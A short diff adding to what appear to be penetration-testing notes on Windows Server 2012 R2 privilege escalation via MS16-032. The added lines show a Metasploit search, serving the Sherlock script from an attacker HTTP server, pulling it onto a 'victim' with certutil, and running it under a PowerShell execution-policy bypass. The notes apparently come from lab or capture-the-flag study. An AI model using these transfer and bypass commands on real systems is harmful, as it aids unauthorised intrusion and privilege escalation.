@@ -24,5 +24,16 @@ Windows 2012 R2 (6.3 Build 9600) privilege escalation
 
 
 msf> search ms16-032
+run
+
+**Manual **
+
+git clone https://github.com/rasta-mouse/Sherlock
+python -m SimpleHTTPServer 80
+transfer to victim:
+certutil -urlcache -f http://10.10.14.30/Sherlock.ps1 Sherlock.ps1
+
+find vulnerabilities for privilege escalation:
+powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
 
 
